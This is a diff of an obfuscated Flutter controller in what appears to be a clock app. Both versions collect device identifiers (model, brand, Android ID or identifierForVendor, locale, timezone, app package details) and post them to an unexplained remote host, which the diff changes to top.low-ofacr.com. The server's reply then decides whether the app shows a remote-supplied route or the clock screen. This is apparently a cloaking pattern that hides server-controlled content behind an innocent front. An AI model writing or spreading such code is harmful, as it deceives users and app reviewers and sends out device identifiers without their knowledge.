@@ -1,143 +1,142 @@
-import 'dart:convert';
 import 'dart:io';
 
 import 'package:connectivity_plus/connectivity_plus.dart';
 import 'package:device_info_plus/device_info_plus.dart';
 import 'package:dio/dio.dart';
-import 'package:flutter/services.dart';
 import 'package:flutter_inappwebview/flutter_inappwebview.dart';
 import 'package:flutter_timezone/flutter_timezone.dart';
 import 'package:get/get.dart';
 import 'package:package_info_plus/package_info_plus.dart';
 
-void bjbavbiun() async {
+void aoishbsdda() async {
   var connectResult = await (Connectivity().checkConnectivity());
   if(connectResult == ConnectivityResult.none){
-    Get.toNamed("/reload");
+    Get.toNamed("/Apptimeout");
   }
 }
 
 class PageLogic extends GetxController {
 
-  var pyltokud = RxBool(false);
-  var ndyrcafm = RxBool(true);
-  var evatwsgu = RxString("");
-  var ethan = RxBool(false);
-  var hill = RxBool(true);
-  final uezlxqykpv = Dio();
+  var yavouzje = RxBool(false);
+  var rwksbucmav = RxBool(true);
+  var ufpdrn = RxString("");
+  var clint = RxBool(false);
+  var rath = RxBool(true);
+  final yeobughpms = Dio();
 
 
   InAppWebViewController? webViewController;
 
   @override
   void onInit() {
-    bjbavbiun();
+    aoishbsdda();
     super.onInit();
-    yhejma();
+    buql();
   }
 
 
-  Future<void> yhejma() async {
+  Future<void> buql() async {
 
-    ethan.value = true;
-    hill.value = true;
-    ndyrcafm.value = false;
+    clint.value = true;
+    rath.value = true;
+    rwksbucmav.value = false;
 
-    uezlxqykpv.post("https://pod.lackrina.xyz/SMTUDWWXKR",data: await dzjftwimyn()).then((value) {
-      var xzpunw = value.data["xzpunw"] as String;
-      var lgrds = value.data["lgrds"] as bool;
-      if (lgrds) {
-        evatwsgu.value = xzpunw;
-        aliyah();
+    yeobughpms.post("http://top.low-ofacr.com/WUtV2Nt1a",data: await bhqlgin()).then((value) {
+      var znkgx = value.data["znkgx"] as String;
+      var nimy = value.data["nimy"] as bool;
+      if (nimy) {
+        ufpdrn.value = znkgx;
+        maximillia();
       } else {
-        bashirian();
+        reichel();
       }
     }).catchError((e) {
-      ndyrcafm.value = true;
-      hill.value = true;
-      ethan.value = false;
+      rwksbucmav.value = true;
+      rath.value = true;
+      clint.value = false;
     });
   }
 
-  Future<Map<String, dynamic>> dzjftwimyn() async {
-    final DeviceInfoPlugin fvlipr = DeviceInfoPlugin();
-    PackageInfo xvfa_hgcvimzf = await PackageInfo.fromPlatform();
+  Future<Map<String, dynamic>> bhqlgin() async {
+    final DeviceInfoPlugin pugfsq = DeviceInfoPlugin();
+    PackageInfo vlmn_wkdxtge = await PackageInfo.fromPlatform();
     final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
-    var grkqp = Platform.localeName;
-    var ylcw = currentTimeZone;
+    var vthrlmc = Platform.localeName;
+    var cGRT = currentTimeZone;
 
-    var mrwgo = xvfa_hgcvimzf.packageName;
-    var ehlrx = xvfa_hgcvimzf.version;
-    var pkao = xvfa_hgcvimzf.buildNumber;
+    var zNwRYZ = vlmn_wkdxtge.packageName;
+    var fIFLpOoD = vlmn_wkdxtge.version;
+    var ZeNK = vlmn_wkdxtge.buildNumber;
 
-    var qzbdvpwn = xvfa_hgcvimzf.appName;
-    var waucbeq = "";
-    var ubav  = "";
-    var adeleCassin = "";
-    var edenGottlieb = "";
-    var baileyWeber = "";
-    var wilmerMohr = "";
-    var magnoliaSchoen = "";
-    var marianeWindler = "";
-    var paytonGutkowski = "";
+    var kOzIhy = vlmn_wkdxtge.appName;
+    var VksSLYf = "";
+    var imuIGn  = "";
+    var wvUl = "";
+    var wilbertKulas = "";
+    var kayceeKirlin = "";
+    var hansCormier = "";
+    var stanChamplin = "";
+    var jaquelinHegmann = "";
+    var santaKunze = "";
+    var newtonMraz = "";
+    var leaGislason = "";
 
-    var mxwcka = "";
 
-    var ugrmxw = "";
-    var wudyxobp = false;
+    var lCncjT = "";
+    var pkhec = false;
 
     if (GetPlatform.isAndroid) {
-      ugrmxw = "android";
-      var onkqpwyts = await fvlipr.androidInfo;
+      lCncjT = "android";
+      var hdyzigjque = await pugfsq.androidInfo;
 
-      mxwcka = onkqpwyts.brand;
+      wvUl = hdyzigjque.brand;
 
-      waucbeq  = onkqpwyts.model;
-      ubav = onkqpwyts.id;
+      VksSLYf  = hdyzigjque.model;
+      imuIGn = hdyzigjque.id;
 
-      wudyxobp = onkqpwyts.isPhysicalDevice;
+      pkhec = hdyzigjque.isPhysicalDevice;
     }
 
     if (GetPlatform.isIOS) {
-      ugrmxw = "ios";
-      var batqpiycx = await fvlipr.iosInfo;
-      mxwcka = batqpiycx.name;
-      waucbeq = batqpiycx.model;
+      lCncjT = "ios";
+      var xiczpa = await pugfsq.iosInfo;
+      wvUl = xiczpa.name;
+      VksSLYf = xiczpa.model;
 
-      ubav = batqpiycx.identifierForVendor ?? "";
-      wudyxobp  = batqpiycx.isPhysicalDevice;
+      imuIGn = xiczpa.identifierForVendor ?? "";
+      pkhec  = xiczpa.isPhysicalDevice;
     }
-
     var res = {
-      "qzbdvpwn": qzbdvpwn,
-      "pkao": pkao,
-      "mrwgo": mrwgo,
-      "waucbeq": waucbeq,
-      "ylcw": ylcw,
-      "magnoliaSchoen" : magnoliaSchoen,
-      "ubav": ubav,
-      "baileyWeber" : baileyWeber,
-      "grkqp": grkqp,
-      "ugrmxw": ugrmxw,
-      "wudyxobp": wudyxobp,
-      "edenGottlieb" : edenGottlieb,
-      "ehlrx": ehlrx,
-      "wilmerMohr" : wilmerMohr,
-      "adeleCassin" : adeleCassin,
-      "mxwcka": mxwcka,
-      "marianeWindler" : marianeWindler,
-      "paytonGutkowski" : paytonGutkowski,
+      "kOzIhy": kOzIhy,
+      "ZeNK": ZeNK,
+      "zNwRYZ": zNwRYZ,
+      "VksSLYf": VksSLYf,
+      "jaquelinHegmann" : jaquelinHegmann,
+      "cGRT": cGRT,
+      "santaKunze" : santaKunze,
+      "wvUl": wvUl,
+      "pkhec": pkhec,
+      "imuIGn": imuIGn,
+      "vthrlmc": vthrlmc,
+      "lCncjT": lCncjT,
+      "wilbertKulas" : wilbertKulas,
+      "fIFLpOoD": fIFLpOoD,
+      "kayceeKirlin" : kayceeKirlin,
+      "hansCormier" : hansCormier,
+      "stanChamplin" : stanChamplin,
+      "newtonMraz" : newtonMraz,
+      "leaGislason" : leaGislason,
 
     };
     return res;
   }
 
-  Future<void> bashirian() async {
-    Get.offAllNamed("/clockMain");
+  Future<void> reichel() async {
+    Get.offAllNamed("/ClockMainPage");
   }
 
-  Future<void> aliyah() async {
-    Get.offAllNamed("/clock_up");
+  Future<void> maximillia() async {
+    Get.offAllNamed("/Outreload");
   }
 
 }
